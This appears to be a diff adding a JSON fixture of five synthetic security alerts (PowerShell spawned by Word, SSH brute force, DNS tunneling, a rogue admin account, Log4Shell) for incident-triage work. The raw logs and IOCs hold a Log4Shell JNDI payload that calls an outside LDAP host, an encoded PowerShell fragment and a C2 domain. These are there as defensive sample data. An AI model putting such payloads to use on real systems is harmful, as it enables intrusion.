@@ -1,0 +1,52 @@
+[
+  {
+    "title": "Suspicious PowerShell Execution with Encoded Command",
+    "description": "EDR detected PowerShell process spawned by Word.exe with a base64-encoded command argument. Process attempted network connection to external IP.",
+    "source": "CrowdStrike EDR",
+    "raw_log": "2024-01-15T14:23:11Z WARN process_create parent=WINWORD.EXE child=powershell.exe args='-enc JABjAGwAaQBlAG4AdAAgAD0A...' network_conn=203.0.113.42:4444",
+    "source_ip": "192.168.1.105",
+    "destination_ip": "203.0.113.42",
+    "affected_host": "WORKSTATION-042",
+    "iocs": ["203.0.113.42", "JABjAGwAaQBlAG4AdAAgAD0A"]
+  },
+  {
+    "title": "Multiple Failed SSH Login Attempts Followed by Success",
+    "description": "SSH brute force attack detected: 847 failed login attempts from single IP over 10 minutes, followed by successful authentication using root account.",
+    "source": "Elastic SIEM",
+    "raw_log": "2024-01-15T09:14:55Z ALERT ssh_brute_force src_ip=198.51.100.73 target=prod-db-01 failed_attempts=847 success=true user=root",
+    "source_ip": "198.51.100.73",
+    "destination_ip": "10.0.0.25",
+    "affected_host": "prod-db-01",
+    "iocs": ["198.51.100.73"]
+  },
+  {
+    "title": "Potential Data Exfiltration via DNS Tunneling",
+    "description": "Unusual DNS query volume detected from internal host. Queries contain anomalously long subdomains consistent with DNS tunneling tools (iodine/dnscat2).",
+    "source": "Palo Alto Firewall",
+    "raw_log": "2024-01-15T16:45:02Z WARN dns_anomaly host=FINANCE-PC-07 queries_per_min=2847 avg_subdomain_length=58 suspicious_domain=exfil.attacker-c2.com",
+    "source_ip": "192.168.10.87",
+    "destination_ip": "185.220.101.45",
+    "affected_host": "FINANCE-PC-07",
+    "iocs": ["exfil.attacker-c2.com", "185.220.101.45"]
+  },
+  {
+    "title": "New Admin Account Created Outside Business Hours",
+    "description": "A new local administrator account 'svcadmin2' was created at 2:37 AM on a domain controller by an account that is not in the IT admin group.",
+    "source": "Windows Event Log / SIEM",
+    "raw_log": "2024-01-16T02:37:44Z EVENT_ID=4720 account_created=svcadmin2 created_by=jsmith privilege=administrator host=DC-PRIMARY time=02:37:44",
+    "source_ip": null,
+    "destination_ip": null,
+    "affected_host": "DC-PRIMARY",
+    "iocs": ["svcadmin2"]
+  },
+  {
+    "title": "CVE-2021-44228 Log4Shell Exploitation Attempt",
+    "description": "WAF detected inbound request containing Log4Shell payload string in User-Agent header targeting public-facing Java application.",
+    "source": "AWS WAF",
+    "raw_log": "2024-01-15T11:22:33Z BLOCK src_ip=45.142.212.100 target=/api/login payload='${jndi:ldap://45.142.212.100:1389/exploit}' header=User-Agent",
+    "source_ip": "45.142.212.100",
+    "destination_ip": "10.0.1.50",
+    "affected_host": "webapp-prod-01",
+    "iocs": ["45.142.212.100", "${jndi:ldap://45.142.212.100:1389/exploit}"]
+  }
+]
